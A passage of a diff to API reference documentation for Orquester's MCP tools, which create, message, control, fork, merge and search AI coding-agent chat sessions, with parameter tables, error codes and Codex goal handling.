-| `list_sessions` | `project?`, `kind? = "all"` (`"chat"` \| `"terminal"` \| `"all"`), `attention? = false` | `{sessions: SessionView[]}` | The tab strip; with `attention: true`, the Attention Center |
-| `get_session` | `sessionId` | `{session: SessionDetail}` (a terminal tab: its `SessionView`) | The open chat tab: composer chips, request and plan cards, subagent roster, context meter |
+| `list_sessions` | `project?`, `kind? = "all"` (`"chat"` \| `"terminal"` \| `"all"`), `attention? = false`, `limit?` | `{sessions: SessionView[]}` | The tab strip; with `attention: true`, the Attention Center |
+| `get_session` | `sessionId` | `{session: SessionDetail, lineage, pendingDeliveries, result?}` (a terminal tab: its `SessionView`) | The open chat tab: composer chips, request and plan cards, subagent roster, context meter, fork chip |
 | `get_turn_diff` | `sessionId`, `turn?` (default: the latest turn with a checkpoint) | `{turn, fromTurn, files: [{path, additions, deletions}], filesTruncated?, omittedFiles?, diff, truncated}` | A turn's changed-files card |
-| `create_session` | `project`, `agent` (required unless `resume`), `model?`, `options?`, `runtimeMode? = "full-access"`, `accountId?`, `title?`, `cwd?`, `resume?: {conversationId}` | `{session: SessionDetail}` | The `+` menu; the resume picker |
 | `update_session` | `sessionId`, `title?`, `model?`, `options?`, `runtimeMode?`, `accountId?`, `force? = false` | `{applied: string[], session: SessionDetail}` | The composer's model, effort/option, permission and account chips; renaming the tab |
-| `interrupt_session` | `sessionId` | `{seq, session}` | Stop / Esc |
-| `stop_task` | `sessionId`, `taskId` | `{seq, session}` | A workflow run's Stop in the agent roster |
-| `stop_session` | `sessionId` | `{seq, session}` | None — the GUI has no control for it |
-| `close_session` | `sessionId` | `{closed: true, sessionId}` | Closing the tab |
-| `revert_session` | `sessionId`, `keepTurns` | `{seq, session}` | "Rewind the conversation to here" |
-| `compact_session` | `sessionId` | `{seq, session}` | "Compact context" |
-| `fork_session` | `sessionId`, `throughTurn?` (default: the latest finished turn), `title?` | `{strategy, lineage, session}` | "Fork from here" on a message |
-| `merge_back_session` | `sessionId` (the fork), `text?` (default: the fork's final reply) | `{parentSessionId, delivery: "sent" \| "queued", mergeId, seq?}` | The fork's "Merge back" |
-| `resolve_merge_back` | `sessionId` (the fork or the parent), `mergeId`, `action` (`"deliver"` \| `"discard"`) | `{mergeId, outcome: "sent" \| "discarded", seq?}` | A pending merge's "Deliver now" / "Retry" / "Discard" |
-| `get_session_lineage` | `sessionId` | `{sessionId, lineage, parent, children, pendingMerges}` | The fork chip and the forks list in the chat header |
+| `control_session` | `sessionId`, `action`, `taskId?` (`stop_task`), `keepTurns?` (`rewind`) | `{seq, session}`; `close`: `{closed: true, sessionId}` | Stop / Esc; a task's Stop; "Compact context"; "Rewind the conversation to here"; closing the tab |
 
 - **`list_sessions`** — ordered by project, then tab order. With `attention: true`, only the
   sessions whose `attention` is set or whose `status` is `waiting`, newest attention first by
@@ -488,26 +601,6 @@ and its default model (the flagged one, else the first) are never shed.
   20 000 bytes of the result, or more when the whole diff leaves more unused; a list longer than
   that keeps its head (`filesTruncated: true`, with `omittedFiles` counting the rest), and the diff
   gets the rest of the result.
-- **`create_session`** — every check runs before anything is created, and each refusal names the
-  valid values. The project must resolve; the agent must be a chat agent that is `enabled` here;
-  `model` must be in its catalogue (default: the catalogue's default model); every `options` id
-  and value must be one the model offers; `accountId` must be `"system"` or an account of the
-  agent's family — checked here because the daemon would silently fall back to its own
-  login; `cwd` (absolute, or relative to the project; default: the project) must be an existing
-  directory inside the sandbox; and the project must have fewer than **24** running sessions
-  (`SESSION_BUSY` otherwise — the GUI has no such cap). An omitted `accountId` means the family's
-  default account. With `resume`, the conversation must be one `list_conversations` lists
-  for the project (never an OpenCode one: OpenCode history is not listed, so an OpenCode
-  conversation cannot be resumed): its row decides the agent (`agent` may be omitted, and must
-  match if given) and the default title, and a conversation stored under a managed account
-  resumes under that account. A row with `resumable: false` is refused (`INVALID_ARGUMENT`): its
-  agent is not a chat agent enabled on this host. `RESUME_UNAVAILABLE` and
-  `SESSION_UNAVAILABLE` pass through with the daemon's message (a conversation already open in
-  another tab arrives as `SESSION_UNAVAILABLE`).
-  If the tab was created but could not be read back, the error's `detail` carries `sessionId` and
-  `created: true`: use that id and do not create again. The first message is a separate
-  `send_message`. An empty `agent`, `model` or `cwd` is refused (`INVALID_ARGUMENT`), never read as
-  the default; so is an empty `model` on `update_session`.
 - **`update_session`** — one call for everything on the composer bar except plan mode, which is
   per message. `options` are merged onto the session's current ones (setting `effort` keeps
   `thinking`), and options the new model does not offer are dropped, as the composer does. Model,
@@ -521,8 +614,9 @@ and its default model (the flagged one, else the first) are never shed.
   pending request, no background work (`SESSION_BUSY` otherwise); OpenCode has no per-session
   account. While a Codex goal continues (`chat.goal.continuing`) the session never goes idle — the
   agent starts the goal's next turn by itself — so the switch is refused first, before anything is
-  written, with `SESSION_BUSY` `Pause the goal before switching accounts: interrupt_session pauses
-  it and stops the running turn (or send_message "/goal pause", then let the turn finish).` — a
+  written, with `SESSION_BUSY` `Pause the goal before switching accounts: control_session {action:
+  "interrupt"} pauses it and stops the running turn (or send_message "/goal pause", then let the
+  turn finish).` — a
   pause alone stops only the NEXT goal turn, never the one running. A mid-turn model or permission
   change under a continuing goal gets the same advice. A goal an Orquester update holds
   (`chat.goal.heldForUpdate`) refuses the switch too, with `The goal is held for an Orquester update
@@ -531,65 +625,172 @@ and its default model (the flagged one, else the first) are never shed.
   the switch: the resumed goal continues). It starts no next turn, so a mid-turn model or
   permission change under it gets the plain turn advice. If a write fails after others landed,
   the error's `detail` carries `applied`.
-- **`interrupt_session`** — interrupts the running turn (its pending requests are cancelled); with
-  no turn running, stops every live subagent, background shell and watch loop. On an agent that
-  continues a goal by itself (Codex), Stop pauses the goal first — an interrupt alone would let the
-  goal's next turn start at once — so the goal reads `paused` afterwards; `send_message
-  "/goal resume"` picks it up again.
-- **`stop_task`** — stops ONE live background task — a workflow run, a subagent or a background
-  shell — by its `subagents[].id`; the turn and every other task keep running. Only where
-  `supports.taskStop` is true (Claude). The agent host refuses with `COMMAND_REJECTED` a task it
-  does not list, one no longer running, a loop or a goal, and a workflow's member (`A workflow's
-  agents cannot be stopped one by one. Stop the whole workflow instead.`): the provider runs a
-  workflow as one task, so pass the workflow's own id. The stop lands as the task's `interrupted`
-  status; one the provider failed lands as a `provider.task.stop.failed` timeline row.
-- **`stop_session`** — stops the provider process but keeps the tab, its history and its resume
-  cursor; the next `send_message` resumes the conversation. A session whose `chat.sessionStatus` is
-  `error` still takes a message — `send_message` and `implement_plan` restart it from its cursor,
-  as they resume a stopped one — but refuses every other command except `revert_session`:
-  `update_session` (a model, option or permission change), `interrupt_session`, `compact_session`,
-  `answer_question`, `dismiss_question` and `resolve_approval` pass through the host's
-  `COMMAND_REJECTED` (`This thread's session is in an error state. Stop the session or rewind to
-  continue.`). Send a message, or `stop_session`, then try again. For Grok it also stops the processes the agent's work
-  started — its background shells and whatever they run (a dev server), which the Grok CLI starts
-  outside its own process tree: a deploy, a restart or a crash leaves those running (their task
-  rows close saying so), and only the user ending the session (this, or `close_session`) stops them
-  — what earlier launches of the chat left included, whether or not a session is live.
-- **`close_session`** — closes a chat or a terminal tab. A chat tab's Orquester thread (its event
-  log) is deleted; the provider's own transcript survives and stays resumable through
-  `list_conversations` for Claude, Codex and Grok.
-  OpenCode history is not listed, so for OpenCode closing a tab is final. A terminal tab's command
-  is killed with it, and a Grok chat's background processes are stopped as `stop_session` stops
-  them.
-- **`revert_session`** — keeps the first `keepTurns` started turns and drops the rest
-  (`0 ≤ keepTurns < turnCount`). Conversation only — files are not restored. Refused with
-  `INVALID_ARGUMENT` for an agent without rollback (Grok) and for a target before the last context
-  compaction (the agent no longer holds what came before it, and the GUI offers no rewind there;
-  the message names the `keepTurns` range still allowed, if any). Only the conversation's own
-  compactions count: a subagent compacting its own context does not stop a rewind. Refused with
-  `SESSION_BUSY` while a turn is active and with `PENDING_REQUEST` while a question or an approval
-  is open. The host rewinds after it has accepted the command, so the tool waits up to 10 s for the
-  outcome. It returns `{seq, session}` once the turns are gone. If the rewind fails (the adapter
-  refuses it), it answers `COMMAND_REJECTED` with the host's reason (`Rewind failed: …`,
-  `detail: {seq, activityId, reason?}`). If the rewind is still running, it answers `SESSION_BUSY`
-  (`detail: {seq}`) and says not to call `revert_session` again: the rewind has landed once
-  `get_session`'s `chat.turnCount` comes down to `keepTurns`, and a failed one shows in
-  `read_transcript` as a "Rewind failed" error. If the session is closed while the tool waits, it
-  answers `SESSION_NOT_FOUND` (`Session "<id>" was closed while rewinding.`, `detail: {seq}`). Any
-  error after the command was accepted carries its `seq` in `detail`.
-- **`compact_session`** — asks the agent to compact its context window. The host refuses while a
-  turn runs (`COMPACTION_UNAVAILABLE`) and on an empty conversation (`COMMAND_REJECTED`). Under a
-  continuing Codex goal a turn is nearly always running, and the refusal says `Pause the goal before
-  compacting.` instead: `interrupt_session` (it pauses the goal and stops the turn), compact, then
-  `send_message "/goal resume"`. A `/goal pause` alone lets the running turn finish first. A goal
-  an Orquester update holds (`chat.goal.heldForUpdate`) is paused already and starts no next turn,
-  so while its final turn runs the refusal is the plain one (`Context compaction is unavailable
-  while a provider turn is running.`): wait for that turn, then compact.
+- **`control_session`** — the GUI's controls, one `action` per call; an argument of another action
+  (`keepTurns` beside `interrupt`) is refused, as is an action missing its own (`stop_task` without
+  `taskId`, `rewind` without `keepTurns`).
+  - **`interrupt`** — interrupts the running turn (its pending requests are cancelled); with
+    no turn running, stops every live subagent, background shell and watch loop. On an agent that
+    continues a goal by itself (Codex), Stop pauses the goal first — an interrupt alone would let the
+    goal's next turn start at once — so the goal reads `paused` afterwards; `send_message
+    "/goal resume"` picks it up again.
+  - **`stop_task`** — stops ONE live background task — a workflow run, a subagent or a background
+    shell — by its `subagents[].id`; the turn and every other task keep running. Only where
+    `supports.taskStop` is true (Claude). The agent host refuses with `COMMAND_REJECTED` a task it
+    does not list, one no longer running, a loop or a goal, and a workflow's member (`A workflow's
+    agents cannot be stopped one by one. Stop the whole workflow instead.`): the provider runs a
+    workflow as one task, so pass the workflow's own id. The stop lands as the task's `interrupted`
+    status; one the provider failed lands as a `provider.task.stop.failed` timeline row.
+  - **`stop_process`** — stops the provider process but keeps the tab, its history and its resume
+    cursor; the next `send_message` resumes the conversation. A session whose `chat.sessionStatus` is
+    `error` still takes a message — `send_message` restarts it from its cursor, as it resumes a
+    stopped one — but refuses every other command except `rewind`: `update_session` (a model,
+    option or permission change), `interrupt`, `compact` and `respond_to_request` pass through the
+    host's `COMMAND_REJECTED` (`This thread's session is in an error state. Stop the session or rewind to
+    continue.`). Send a message, or `stop_process`, then try again. For Grok it also stops the processes the agent's work
+    started — its background shells and whatever they run (a dev server), which the Grok CLI starts
+    outside its own process tree: a deploy, a restart or a crash leaves those running (their task
+    rows close saying so), and only the user ending the session (this, or `close`) stops them
+    — what earlier launches of the chat left included, whether or not a session is live.
+  - **`close`** — closes a chat or a terminal tab. A chat tab's Orquester thread (its event
+    log) is deleted; the provider's own transcript survives and stays resumable through
+    `list_conversations` for Claude, Codex and Grok.
+    OpenCode history is not listed, so for OpenCode closing a tab is final. A terminal tab's command
+    is killed with it, and a Grok chat's background processes are stopped as `stop_process` stops
+    them.
+  - **`rewind`** — keeps the first `keepTurns` started turns and drops the rest
+    (`0 ≤ keepTurns < turnCount`). Conversation only — files are not restored. Refused with
+    `INVALID_ARGUMENT` for an agent without rollback (Grok) and for a target before the last context
+    compaction (the agent no longer holds what came before it, and the GUI offers no rewind there;
+    the message names the `keepTurns` range still allowed, if any). Only the conversation's own
+    compactions count: a subagent compacting its own context does not stop a rewind. Refused with
+    `SESSION_BUSY` while a turn is active and with `PENDING_REQUEST` while a question or an approval
+    is open. The host rewinds after it has accepted the command, so the tool waits up to 10 s for the
+    outcome. It returns `{seq, session}` once the turns are gone. If the rewind fails (the adapter
+    refuses it), it answers `COMMAND_REJECTED` with the host's reason (`Rewind failed: …`,
+    `detail: {seq, activityId, reason?}`). If the rewind is still running, it answers `SESSION_BUSY`
+    (`detail: {seq}`) and says not to call `rewind` again: the rewind has landed once
+    `get_session`'s `chat.turnCount` comes down to `keepTurns`, and a failed one shows in
+    `read_transcript` as a "Rewind failed" error. If the session is closed while the tool waits, it
+    answers `SESSION_NOT_FOUND` (`Session "<id>" was closed while rewinding.`, `detail: {seq}`). Any
+    error after the command was accepted carries its `seq` in `detail`.
+  - **`compact`** — asks the agent to compact its context window. The host refuses while a
+    turn runs (`COMPACTION_UNAVAILABLE`) and on an empty conversation (`COMMAND_REJECTED`). Under a
+    continuing Codex goal a turn is nearly always running, and the refusal says `Pause the goal before
+    compacting.` instead: `interrupt` (it pauses the goal and stops the turn), compact, then
+    `send_message "/goal resume"`. A `/goal pause` alone lets the running turn finish first. A goal
+    an Orquester update holds (`chat.goal.heldForUpdate`) is paused already and starts no next turn,
+    so while its final turn runs the refusal is the plain one (`Context compaction is unavailable
+    while a provider turn is running.`): wait for that turn, then compact.
 
+### Conversation
+
+| Tool | Input | Returns | GUI equivalent |
+|---|---|---|---|
+| `create_session` | `project`, `agent` (required unless `resume`), `model?`, `options?`, `runtimeMode? = "full-access"`, `accountId?`, `title?`, `cwd?`, `resume?: {conversationId}`, `prompt?`, `reply? = "none"` (`"wait"` \| `"none"`), `timeoutSeconds? = 120` (≤ 600) | `{sessionId, accountId, accountSource, accountNote?, isLegacy?, session: SessionDetail, firstTurn?}` | The `+` menu; the resume picker; the first message |
+| `send_message` | `sessionId`, `text?`, `attachments?` (≤ 8, §9), `planMode?`, `implementPlan?`, `reply? = "wait"` (`"wait"` \| `"none"`), `timeoutSeconds? = 120` (1–600) | `{seq, outcome, turnId?, reply?, replyTruncated?, answer?, answerTruncated?, hint?, pending?, session}` | The composer's Send (Enter during a turn steers it); the plan card's **Implement** |
+| `fork_session` | `sessionId`, `throughTurn?` (default: the latest finished turn) or `messageId?`, `title?` | `{strategy, lineage, session}` | "Fork from here" on a message |
+| `merge_back_session` | `sessionId` (the fork), `text?` (default: the fork's final reply) — or `sessionId` (the fork or the parent), `mergeId`, `action` (`"deliver"` \| `"discard"`) | `{parentSessionId, delivery: "sent" \| "queued", mergeId, seq?}` — or `{mergeId, outcome: "sent" \| "discarded", seq?}` | The fork's "Merge back"; a pending delivery's "Deliver now" / "Retry" / "Discard" |
+
+- **`create_session`** — every check runs before anything is created, and each refusal names the
+  valid values. The project must resolve; the agent must be a chat agent that is `enabled` here;
+  `model` must be in its catalogue (default: what `list_agents` marks `isDefault`, never a legacy
+  model; a legacy model named explicitly is accepted and the result says `isLegacy: true`); every
+  `options` id and value must be one the model offers; `accountId` must be `"system"` or an account
+  of the agent's family — checked here because the daemon would silently fall back to its own
+  login; `cwd` (absolute, or relative to the project; default: the project) must be an existing
+  directory inside the project (`PERMISSION_DENIED` outside it, `PATH_NOT_ALLOWED` outside the
+  sandbox); and the project must have fewer than **24** running sessions (`SESSION_BUSY`
+  otherwise — the GUI has no such cap). An omitted `accountId` means the family's default account;
+  the result says which account the session got (`accountId`, `"system"` for the daemon's own
+  login) and how (`accountSource`: `requested` or `family-default`, with `accountNote` when the
+  named account could not be used). With `resume`, the conversation must be one
+  `list_conversations` lists for the project (never an OpenCode one: OpenCode history is not
+  listed, so an OpenCode conversation cannot be resumed): its row decides the agent (`agent` may be
+  omitted, and must match if given) and the default title, and a conversation stored under a
+  managed account resumes under that account. A row with `resumable: false` is refused
+  (`INVALID_ARGUMENT`): its agent is not a chat agent enabled on this host. `RESUME_UNAVAILABLE`
+  and `SESSION_UNAVAILABLE` pass through with the daemon's message (a conversation already open in
+  another tab arrives as `SESSION_UNAVAILABLE`).
+  With `prompt`, the first message goes out at once, as `send_message` sends it: `reply: "none"`
+  (the default) returns as soon as it is sent, `reply: "wait"` returns the reply of that turn (or
+  at `timeoutSeconds`); `firstTurn` carries the send's `outcome`, `seq`, `turnId`, `reply`. If the
+  tab was created but could not be read back — or its first message could not be sent — the
+  error's `detail` carries `sessionId` and `created: true`: use that id and do not create again.
+  An empty `agent`, `model` or `cwd` is refused (`INVALID_ARGUMENT`), never read as the default;
+  so is an empty `model` on `update_session`. A session an external client creates belongs to
+  nobody: it records no lineage, and no in-chat agent may close or reconfigure it as its own.
+- **`send_message`** — needs `text` (at most 120 000 characters after trimming) or at least one
+  attachment, or `implementPlan: true` alone. `reply` decides what happens to a session that is
+  working:
+  - **`reply: "wait"`** (the default) — the message is this session's **next turn**: a working
+    session gets it once its running turn is over (the call waits for that, then sends — a turn
+    never steered), an idle one at once. The call returns as §8 describes, with `reply` — the main
+    agent's answer from THAT turn (Codex's commentary narration left out while the turn has
+    anything else — see `lastReply`) — once it settled; `pending` while a question or an approval
+    of it is open. A session that stays busy for the whole `timeoutSeconds` is never sent to: the
+    call answers `outcome: "timeout"`, `sent: false`, with a hint. A session waiting for its user
+    (an open question or approval) is busy too: the message waits behind the request.
+  - **`reply: "none"`** — returns `outcome: "sent"` with the receipt as soon as the message is
+    posted. While a turn is running the message **steers** it (as Enter does mid-turn in the GUI)
+    and `turnId` is that turn's. It is refused with `PENDING_REQUEST` while a question or an
+    approval is open — the message names each one and `respond_to_request`, like the GUI's "answer
+    the request above first"; a Codex `/goal` (below) is the one message that goes through, as it
+    does in the GUI.
+
+  `reply` is at most 16 384 characters, fewer when the result would pass the cap (cut by bytes, on
+  a character boundary), `replyTruncated: true` when cut, and `read_transcript` has the rest; when
+  `reply` is present, `session.lastReply` is left out: it is the same text. A session in `error` is
+  restarted from its cursor by the message, as the GUI's composer does. `planMode: true` needs an
+  agent with the plan toggle (`supports.planMode`); OpenCode's plan agent is a model option
+  instead, `update_session {options: {"agent": "plan"}}`. Attachments are validated and uploaded
+  first; a refused one fails the call before anything is sent (with `reply: "wait"`, nothing is
+  uploaded for a message that is never sent).
+
+  **`implementPlan: true`** sends exactly what the GUI's Implement button sends: the line `PLEASE
+  IMPLEMENT THIS PLAN:` followed by the latest proposed plan, in default (not plan) mode, with no
+  text or attachments of yours (`planMode` must be left out). A plan too long for the thread
+  snapshot (`plan.truncated: true`) is read back in full first, as the Implement button does too; a
+  cut plan is never sent. Refused with `INVALID_ARGUMENT` when there is no proposed plan or the
+  latest one was already sent for implementation (judged on the thread, as `get_session`'s
+  `plan.actionable` and `read_transcript`'s plan rows are). To refine a plan instead (the Refine
+  button), use `send_message {planMode: true, text}`.
+
+  Text that starts with `/` is forwarded to the agent as typed, and its CLI decides what the
+  command does; the exceptions are Grok's `/always-approve`, refused with `INVALID_COMMAND`
+  (change `runtimeMode` with `update_session` instead), and Codex's `/goal` (next paragraph). A
+  message that is just `/compact`, with no attachments, is the host's own compaction — what
+  `control_session {action: "compact"}` asks for. The MCP cannot list an agent's slash commands or skills.
+
+  **Goals.** Claude, Codex and Grok run goals of their own; Orquester shows them and never runs a
+  loop itself. On Claude and Grok `/goal <objective>` is the CLI's own command and an ordinary
+  turn, waited on like any other (Claude checks the goal whenever a turn ends with nothing running
+  in the background; Grok works the whole goal inside the prompt that set it, though its own wake
+  prompts — a background subagent's end, say — are turns of their own). On **Codex** the host runs
+  `/goal` itself — `/goal <objective>`, `/goal` or `/goal status`, `/goal pause`, `/goal resume`,
+  `/goal clear`, `/goal edit <objective>` (`supports.goals.command: "host"`): it records the
+  message, starts **no** turn, and answers in a row. With `reply: "wait"` the call waits for that
+  answer — up to 15 s once the session is up (the host starts it first when there is none, after
+  `stop_process` or a restart), never past `timeoutSeconds` — and returns `outcome: "goal"` with
+  `answer`: the goal's new state (`Goal set: …`, `Goal paused`, …, one line per row when a command
+  writes several — replacing a goal writes `Goal cleared: …`, then `Goal set: …`) or the status
+  `/goal` asked for; or `outcome: "failed"` with why (`Goal command failed: …`). `answer` is at most
+  8 KiB of UTF-8, `answerTruncated: true` when cut. No `turnId`, no `reply`. A command that changes
+  nothing writes no row: a pause of a paused goal or a resume of an active one — which the call
+  sees coming, and waits only half a second for — or an edit to the same objective. Then it comes
+  back without `answer` and with a `hint`; `session.chat.goal` always shows the goal as it stands.
+  A row an Orquester update writes on a goal it holds (`Goal paused for an Orquester update. …`, or
+  that the goal could not be resumed after it) answers no `/goal`, and is never taken for one.
+  A set goal then runs turns by itself — `wait_for_session` reports it once it stops. A `/goal`
+  with attachments is refused (`INVALID_ARGUMENT`, before anything is uploaded), and one the host
+  cannot parse — an objective over 4 000 characters, a bare `/goal edit` — with `INVALID_COMMAND`,
+  as is any while a compaction runs. While the agent's capabilities cannot be read, any `/goal` is
+  refused (`INVALID_ARGUMENT`, "can't be routed … Retry shortly"): whether the host or the agent
+  takes it is theirs to say.
 - **`fork_session`** — a new chat tab in the same project, with the same agent, model, options,
   permission mode and account, whose conversation is this one's through turn `throughTurn` (the
   turn numbers `read_transcript` shows; `0` forks before the first message, a fresh session that
-  only remembers where it came from). The original is never touched, and may even be running: only
+  only remembers where it came from) — or up to `messageId` (a user message: just before it). Give
+  one of the two, not both. The original is never touched, and may even be running: only
   the kept turns must have finished (`COMMAND_REJECTED` "That reply is still being written."
   otherwise). Providers fork at turn boundaries, so a fork keeps whole turns. `strategy` says how
   the conversation was carried over: `"native"` — Claude (`forkSession`), Codex (`thread/fork`) and
@@ -610,7 +811,7 @@ and its default model (the flagged one, else the first) are never shed.
   `commandId` with another fork point, or once the fork it opened was closed, answers
   `COMMAND_ID_CONFLICT` rather than that fork.) The result's `session` is the
   fork's `SessionDetail`.
-- **`merge_back_session`** — sends the fork's result to the session it came from (its `lineage`
+- **`merge_back_session`** — sends a **fork's** result to the session it came from (its `lineage`
   names it) as an ordinary message that starts `[Merged back from fork "<title>"]`: `text`, or the
   fork's final reply (the latest finished turn's answer). An idle parent takes it at once
   (`delivery: "sent"`, with the parent's `seq`); a busy one — a turn running or starting, an approval
@@ -620,8 +821,8 @@ and its default model (the flagged one, else the first) are never shed.
   restarts and delivers each merge exactly once (its first `/turn` goes out under the `mergeId`, a
   retry after a refusal as `<mergeId>:<n>` — the host replays a recorded rejection for an id it has
   seen). Nothing queued disappears: a parent that refuses a merge or is closed leaves it in
-  `pendingMerges` with `state: "failed"` and the reason in `error`, on both tabs, until
-  `resolve_merge_back` delivers or discards it — which is also the way past a parent a continuing
+  `pendingDeliveries` with `state: "failed"` and the reason in `error`, on both tabs, until
+  `merge_back_session {mergeId, action}` delivers or discards it — which is also the way past a parent a continuing
   goal keeps busy (`deliver` sends it now, as a message that steers the running turn). The one
   refusal that is retried is the host's deadline — a step of the `/turn` ran out of time after the
   host was up: `COMMAND_REJECTED` with `detail.reason: "deadline"` (a message ending "timed out
@@ -629,141 +830,24 @@ and its default model (the flagged one, else the first) are never shed.
   up to 3 attempts, the merge staying queued meanwhile with its last `error` and `attempts`. Any
   other refusal of the parent's `/turn` is the thread's own state (an unreadable log, a session in
   error, an invalid message) and fails the merge at once. (A merge never meets
-  `COMPACTION_UNAVAILABLE`: the host queues a message sent during a compaction.) Refused
-  (`COMMAND_REJECTED`) for a session with no parent, a closed parent, or a fork with no finished
-  reply; a merge an idle parent refuses at once is refused to the caller then and not queued —
+  `COMPACTION_UNAVAILABLE`: the host queues a message sent during a compaction.) Refused for a session that is no fork (`INVALID_ARGUMENT`: a delegated or opened chat's final
+  reply goes back to the chat that asked by itself), and (`COMMAND_REJECTED`) for a closed parent or a
+  fork with no finished reply; a merge an idle parent refuses at once is refused to the caller then and not queued —
   unless that refusal is the deadline, which queues it. (On the daemon route, a caller-chosen merge `commandId` must be 1–180
   characters without `:`, else `INVALID_COMMAND`; a merge refused at once under such an id cannot
   be sent again with it — the parent replays its rejection — so a resend needs a new id.
-  `merge_back_session` mints a fresh id per call.)
-- **`get_session_lineage`** — `lineage` is the session's own (`{parentThreadId, relation,
-  forkedFrom?: {messageId, turnId}, createdAt}` or `null`); `parent` is `{sessionId, title, exists}`
-  (`exists: false` once that tab is closed); `children` are the tabs forked from or delegated by
-  this one, oldest first, each with `relation`, `createdAt`, `forkedFrom?`, `chatSessionStatus?` and
-  `latestTurnState?`; `pendingMerges` are the merges to or from this session the parent has not
-  taken: `{mergeId, parentSessionId, childSessionId, queuedAt, state: "queued" | "failed", preview,
-  attempts, error?}` (`preview`: the result's first 200 characters). The same list rides each
-  chat's `SessionSummary` as `pendingMerges`, which is how the GUI shows them.
+  `merge_back_session` mints a fresh id per call.) With `mergeId` and `action`, it acts on a queued
+  delivery (`get_session`'s `pendingDeliveries`) from either side: `deliver` sends it now whatever
+  the parent is doing — an ordinary message, so a running turn is steered — and retries a `failed`
+  one; `discard` drops it.
 
-### Search
+### Transcripts and search
 
 | Tool | Input | Returns | GUI equivalent |
 |---|---|---|---|
+| `read_transcript` | `sessionId`, `turns? = 3` (≤ 200), `beforeTurn?` (2 to `turnCount` + 1), `agentId?` (non-empty), `include? = ["tools", "activity"]` (add `"reasoning"`), `maxChars? = 40000` (2 000–55 000, UTF-8 bytes) | `{entries: TranscriptEntry[], turnCount, olderTurns, coveredTurns: [from, to] \| null, unavailableTurns?: [from, to], truncated, subagents: [{id, title, status}], subagentsTruncated?, hint?}` | The chat timeline, "Load older" included; a subagent's drill-in |
 | `search_sessions` | `query`, `project?`, `limit? = 20` (1–50) | `{query, hits: [{sessionId, title, projectPath, turn, kind, role?, activityKind?, snippet, at}], truncated, omittedHits?, indexed, hint?}` | The command palette's `?` search ("Search conversations") |
 
-- **`search_sessions`** — full-text search over every open chat session: its messages (yours, the
-  agent's and its reasoning) and its activity rows (a tool call's title and detail, among others),
-  best match first. The agent host answers it from its thread index. `query` is trimmed and must
-  then be 1–200 characters; a longer one is refused (`INVALID_ARGUMENT`), never cut. Every word
-  must appear, as a whole word, ignoring case and accents; there are no operators — quotes, `OR`,
-  `NEAR`, `*` and `-` are plain text. `project` limits the search to one project and is resolved
-  as everywhere else (an empty one is refused, never read as every project).
-  Each hit names its session by `sessionId`, with the `title` and `projectPath` `list_sessions`
-  shows for it. `turn` is the hit's turn number (§5), `null` for a row that belongs to no turn;
-  `kind` is `message`, with `role` (`user`, `assistant` or `reasoning`), or `activity`, with
-  `activityKind` (`tool.completed`, …); `at` is when the row was written; and `snippet` is a
-  short excerpt with the matched words between `«` and `»`. To read a hit in context, read its
-  turn alone: `read_transcript {sessionId, beforeTurn: turn + 1, turns: 1}` (with
-  `include: ["reasoning"]` for a reasoning hit). A subagent's own row is in that subagent's
-  timeline, not the parent's, and a hit does not say which subagent wrote it: find the subagent in
-  `get_session`'s `subagents`, then read its timeline with `read_transcript {sessionId, agentId,
-  beforeTurn: turn + 1, turns: 1}`. Only a chat tab that is open now is ever named: a hit whose
-  tab has closed since is left out.
-  `truncated: true` means there were more matches than came back — more than `limit`, or more
-  than one result holds. Each hit's `title` and `snippet` are cut to 300 characters, ending in
-  "…", and if the hits still pass the result cap, the lowest-ranked go, from the end:
-  `omittedHits` counts them. Without `omittedHits`, the host stopped at `limit`: raise `limit`
-  (at most 50) for more. With `omittedHits`, the result cap dropped hits, and a higher `limit`
-  brings none of them back: narrow the query or pass `project`.
-  `indexed: false` is an answer, not an error: the host has no usable index right now (it could
-  not load or open one, or it is restarting), so there are no hits, and a `hint` says search is
-  unavailable; try again later. An index the host is rebuilding (after an update, say) does
-  answer, but finds only the threads it has re-indexed so far. A request that fails — the agent
-  host restarting, for one — is an error with its code, as everywhere.
-
-```jsonc
-search_sessions { "query": "flaky test", "project": "myws/api", "limit": 2 }
-→ { "query": "flaky test",
-    "hits": [
-      { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "title": "Claude Code",
-        "projectPath": "/var/lib/orquester/workspaces/myws/api", "turn": 4, "kind": "message",
-        "role": "assistant", "snippet": "…the «flaky» «test» is the retry in auth.spec.ts…",
-        "at": "2026-09-23T10:41:07.310Z" },
-      { "sessionId": "9b41d7c2-5e3a-4f1b-8c6d-0a2e7f9b3d14", "title": "Codex",
-        "projectPath": "/var/lib/orquester/workspaces/myws/api", "turn": 2, "kind": "activity",
-        "activityKind": "tool.completed", "snippet": "pnpm «test» --grep «flaky»",
-        "at": "2026-09-23T09:12:44.018Z" } ],
-    "truncated": true, "indexed": true }
-
-// The first hit in context: its turn, 4, alone.
-read_transcript { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "beforeTurn": 5, "turns": 1 }
-```
-
-### Messages
-
-| Tool | Input | Returns | GUI equivalent |
-|---|---|---|---|
-| `send_message` | `sessionId`, `text?`, `attachments?` (≤ 8, §9), `planMode? = false`, `wait? = true`, `timeoutMs? = 120000` (1 000–600 000) | `{seq, outcome, turnId?, reply?, replyTruncated?, answer?, answerTruncated?, hint?, pending?, session}` | The composer's Send (Enter during a turn steers it) |
-| `implement_plan` | `sessionId`, `wait? = true`, `timeoutMs? = 120000` (1 000–600 000) | Same as `send_message` | The plan card's **Implement** button |
-| `read_transcript` | `sessionId`, `turns? = 3` (≤ 200), `beforeTurn?` (2 to `turnCount` + 1), `agentId?` (non-empty), `include? = ["tools", "activity"]` (add `"reasoning"`), `maxChars? = 40000` (2 000–55 000, UTF-8 bytes) | `{entries: TranscriptEntry[], turnCount, olderTurns, coveredTurns: [from, to] \| null, unavailableTurns?: [from, to], truncated, subagents: [{id, title, status}], subagentsTruncated?, hint?}` | The chat timeline, "Load older" included; a subagent's drill-in |
-
-- **`send_message`** — needs `text` (at most 120 000 characters after trimming) or at least one
-  attachment. It is refused with `PENDING_REQUEST` while a question or an approval is open — the
-  message names each one and the tool that answers it, like the GUI's "answer the request above
-  first"; a Codex `/goal` (below) is the one message that goes through, as it does in the GUI. A
-  session in `error` is restarted from its cursor by the message, as the GUI's composer does.
-  `planMode: true` needs an agent with the plan toggle (`supports.planMode`); OpenCode's plan agent
-  is a model option instead, `update_session {options: {"agent": "plan"}}`. Attachments are
